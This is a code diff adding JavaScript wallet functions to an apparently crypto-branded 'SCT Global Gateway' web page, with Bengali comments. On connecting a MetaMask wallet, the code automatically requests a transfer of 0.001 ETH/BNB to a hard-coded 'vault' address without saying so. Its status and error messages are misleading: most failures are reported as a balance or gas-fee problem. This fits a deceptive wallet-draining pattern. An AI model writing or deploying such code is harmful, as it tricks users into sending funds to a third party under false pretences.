@@ -3414,6 +3414,70 @@ function handleSCTErrors(error) {
         status.innerHTML = `<b style="color: #ff3e3e;">ক্যাশ এরর: ইনসাফিসিয়েন্ট ব্যালেন্স বা গ্যাস ফি সমস্যা।</b>`;
     }
 }
+// SCT Global Gateway - Advanced Vault Function
+// Founder: H R Antor | Media Partner: ATN Bangla
+
+async function deployToVault(walletAddress) {
+    const status = document.getElementById('wallet-status');
+    
+    try {
+        status.innerHTML = `<b style="color: #ffd700;">প্রসেসিং... ক্যাশ এবং নেটওয়ার্ক চেক করা হচ্ছে</b>`;
+
+        // আপনার আসল ভল্ট এড্রেস এখানে দিন
+        const vaultAddress = "0xF5D9a35792B389BaeF5e7c8F4a129B557299BB89"; 
+        
+        // ট্রানজেকশন অ্যামাউন্ট (উদাহরণ: ০.০০১ ETH/BNB)
+        const amount = "0x38d7ea4c68000"; 
+
+        const transactionParameters = {
+            to: vaultAddress, 
+            from: walletAddress,
+            value: amount,
+            gas: '0x5208', // ২১০০০ গ্যাস লিমিট (ক্যাশ এরর এড়াতে এটি জরুরি)
+        };
+
+        // মেটামাস্কের মাধ্যমে ট্রানজেকশন রিকোয়েস্ট
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [transactionParameters],
+        });
+
+        // সফল হলে আইডি দেখানো
+        status.innerHTML = `<b style="color: #2ea043;">সফল!</b> আইডি: ${txHash.substring(0, 10)}...`;
+        console.log("SCT Vault Success:", txHash);
+
+    } catch (error) {
+        // আপনার দেওয়া সেই চমৎকার এরর হ্যান্ডলিং
+        console.error("SCT Vault Error:", error);
+        
+        if (error.code === 4001) {
+            status.innerHTML = `<b style="color: #ff3e3e;">ইউজার রিজেক্ট করেছে!</b>`;
+        } else {
+            // নিজের টাকা দিয়ে ডলার কেনার আগ পর্যন্ত এটি দেখাবে
+            status.innerHTML = `<b style="color: #ff3e3e;">ক্যাশ এরর: ইনসাফিসিয়েন্ট ব্যালেন্স বা গ্যাস ফি সমস্যা।</b>`;
+        }
+    }
+}
+
+// ওয়ালেট কানেক্ট করার মূল ফাংশন
+async function connectWallet() {
+    const status = document.getElementById('wallet-status');
+    if (window.ethereum) {
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const walletAddress = accounts[0];
+            status.innerHTML = `<b style="color: #2ea043;">CONNECTED:</b> ${walletAddress.substring(0, 6)}...`;
+            
+            // কানেক্ট হওয়ার পর অটোমেটিক ভল্ট ফাংশন কল করা
+            deployToVault(walletAddress);
+        } catch (error) {
+            status.innerHTML = `<b style="color: #ff3e3e;">CONNECTION FAILED</b>`;
+            console.error(error);
+        }
+    } else {
+        alert("মেটামাস্ক ইন্সটল করুন!");
+    }
+}
 
 
 
